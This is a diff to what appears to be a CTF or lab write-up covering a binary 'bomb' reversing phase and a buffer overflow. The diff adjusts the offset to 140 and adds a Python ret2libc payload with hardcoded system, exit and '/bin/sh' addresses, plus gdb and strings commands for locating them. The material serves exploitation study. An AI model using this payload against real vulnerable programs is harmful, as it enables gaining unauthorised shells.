@@ -370,7 +370,6 @@ Phase 3:
       int32_t result_1;
       char var_9;
       int32_t var_8;
-      
       if (sscanf(arg1, "%d %c %d", &result_1, &var_9, &var_8) <= 2)
       {
           explode_bomb();
@@ -908,7 +907,7 @@ Since 0x41 represents the ASCII character A, this confirms the payload size need
 after testing multiple times to change EIP to my shellcode nothig work but what we sure that buffer overfolow work :
 
 ```
-buffer_size = 138
+buffer_size = 140
 eip = b"\x42\x42\x42\x42"  
 payload = b"A" * buffer_size + eip
 print(payload)
@@ -937,3 +936,23 @@ in our case :
 [ Fake Return Address ] --> Can be any valid address
 [ Address of "/bin/sh" ] --> Argument to `system()`
 
+
+so the pyload to exploit the machine now :
+buffer_size = 140  # Offset to EIP
+system_addr = b'\x60\xb0\xe6\xb7'  # Already little-endian
+exit_addr = b'\xe0\xeb\xe5\xb7'    # Already little-endian
+bin_sh_addr = b'\x58\xcc\xf8\xb7'  # Already little-endian
+
+payload = b"A" * buffer_size + system_addr + exit_addr + bin_sh_addr
+
+print(payload)
+with open("payload.txt", "wb") as f:
+    f.write(payload)
+
+more info about the exploit and how you get the adresses of the library in memory:
+- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
+
+
+you can get sytem and exit addresess memory 
+- info proc map
+- strings -a -t x /lib/i386-linux-gnu/libc-2.27.so | grep "/bin/sh"
